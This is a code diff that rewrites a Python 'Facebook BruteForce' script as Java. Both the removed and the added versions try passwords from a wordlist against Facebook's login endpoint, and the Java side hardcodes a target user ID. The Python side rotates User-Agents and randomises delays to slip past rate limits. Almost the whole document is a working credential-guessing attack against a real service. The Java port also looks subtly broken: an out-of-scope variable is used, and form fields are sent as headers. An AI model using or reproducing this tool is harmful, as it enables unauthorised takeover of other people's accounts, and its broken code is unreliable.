@@ -1,87 +1,96 @@
-import os
-import random
-import time
-import requests
-from bs4 import BeautifulSoup
-import sys
+import org.apache.http.HttpEntity;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.util.EntityUtils;
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
+import org.jsoup.nodes.Element;
 
-if sys.version_info[0] != 3:
-    print('\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n\t--------------------------------------')
-    sys.exit()
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.IOException;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Random;
 
-PASSWORD_FILE = "passwords.txt"
-MIN_PASSWORD_LENGTH = 6
-POST_URL = 'https://www.facebook.com/login.php'
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
-}
-MAX_ATTEMPTS_PER_HOUR = 5
-ATTEMPT_COUNTER = 0
+public class FacebookBruteForce {
 
-def create_form():
-    session = requests.Session()
-    data = session.get(POST_URL, headers=HEADERS)
-    soup = BeautifulSoup(data.text, 'html.parser')
-    form = {
-        'lsd': soup.form.input['value'],
+    private static final String POST_URL = "https://www.facebook.com/login.php";
+    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
+    private static final int MAX_ATTEMPTS_PER_HOUR = 5;
+    private static int ATTEMPT_COUNTER = 0;
+
+    public static void main(String[] args) {
+        System.out.println("---------- Welcome To Facebook BruteForce ----------");
+
+        String passwordFile = "passwords.txt";
+        String userId = "61558937932042";
+
+        try {
+            Map<String, String> formData = getFormData();
+            CloseableHttpClient httpClient = HttpClients.createDefault();
+
+            BufferedReader reader = new BufferedReader(new FileReader(passwordFile));
+            String password;
+            while ((password = reader.readLine()) != null) {
+                if (ATTEMPT_COUNTER >= MAX_ATTEMPTS_PER_HOUR) {
+                    System.out.println("Reached maximum attempts per hour. Waiting for an hour...");
+                    Thread.sleep(3600 * 1000);
+                    ATTEMPT_COUNTER = 0;
+                }
+
+                formData.put("pass", password);
+                boolean isPasswordFound = isThisAPassword(httpClient, formData);
+                if (isPasswordFound) {
+                    System.out.println("Password found is: " + password);
+                    break;
+                }
+
+                ATTEMPT_COUNTER++;
+                Thread.sleep(new Random().nextInt(1000) + 2000); // Random delay between 2 and 3 seconds
+            }
+
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
     }
-    user_id = input('Enter User ID to target: ').strip()
-    form['jazoest'] = f'{user_id}_'
-    return form, session
 
-def is_this_a_password(index, password, form, session):
-    global ATTEMPT_COUNTER
+    private static Map<String, String> getFormData() throws IOException {
+        Document doc = Jsoup.connect(POST_URL)
+                .userAgent(USER_AGENT)
+                .get();
 
-    if ATTEMPT_COUNTER >= MAX_ATTEMPTS_PER_HOUR:
-        print("Reached maximum attempts per hour. Waiting for an hour...")
-        time.sleep(3600)
-        ATTEMPT_COUNTER = 0
+        Map<String, String> formData = new HashMap<>();
+        formData.put("lsd", doc.select("input[name=lsd]").first().val());
+        formData.put("jazoest", userId + "_");
 
-    # Add random delay between attempts
-    time.sleep(random.uniform(1, 3))
+        return formData;
+    }
 
-    # Change User-Agent
-    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
+    private static boolean isThisAPassword(CloseableHttpClient httpClient, Map<String, String> formData) {
+        HttpPost httpPost = new HttpPost(POST_URL);
+        httpPost.setHeader("User-Agent", USER_AGENT);
 
-    try:
-        form['pass'] = password
-        r = session.post(POST_URL, data=form, headers=session.headers)
-    except requests.exceptions.RequestException as e:
-        print(f"Error occurred: {e}")
-        return False
+        try {
+            for (Map.Entry<String, String> entry : formData.entrySet()) {
+                httpPost.addHeader(entry.getKey(), entry.getValue());
+            }
 
-    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
-        with open('temp', 'w') as f:
-            f.write(str(r.content))
-        print(f'\nPassword found is: {password}')
-        return True
-    return False
+            CloseableHttpResponse response = httpClient.execute(httpPost);
+            HttpEntity entity = response.getEntity();
+            String responseBody = EntityUtils.toString(entity);
 
-if __name__ == "__main__":
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
-    if not os.path.isfile(PASSWORD_FILE):
-        print(f"Password file is not exist: {PASSWORD_FILE}")
-        sys.exit(0)
+            if (responseBody.contains("Find Friends") || responseBody.contains("security code")
+                    || responseBody.contains("Two-factor authentication") || responseBody.contains("Log Out")) {
+                return true;
+            }
 
-    print(f"Password file selected: {PASSWORD_FILE}")
-    form, session = create_form()
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 
-    with open(PASSWORD_FILE, 'r') as f:
-        password_data = f.read().split("\n")
-
-    # Add a list of User-Agents
-    USER_AGENTS = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
-        # ... add more User-Agents ...
-    ]
-
-    for index, password in enumerate(password_data):
-        password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH:
-            continue
-        print(f"Trying password [{index}]: {password}")
-        if is_this_a_password(index, password, form, session):
-            break
-        ATTEMPT_COUNTER += 1
+        return false;
+    }
+}
